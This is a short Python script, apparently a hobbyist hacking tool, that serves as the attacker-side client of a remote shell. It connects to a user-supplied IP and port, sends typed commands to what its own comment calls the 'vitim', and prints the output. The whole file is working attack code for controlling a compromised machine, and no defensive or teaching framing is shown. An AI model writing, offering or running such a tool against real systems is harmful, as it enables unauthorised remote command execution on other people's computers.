import socket
import subprocess

ip = input("enter ip address")
port = int(input("enter the port number"))

try:
    # we going to create a tcp ipv4 socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))
    cmd = input("$")  # taking input
    while cmd != 'quit':
        # send to vitim
        s.send(cmd.encode())

        # receiving 2048 bytes
        result = s.recv(2048).decode()
        print(result)
        cmd = input("$")
    s.close()

except:
    print("something error has occurred")
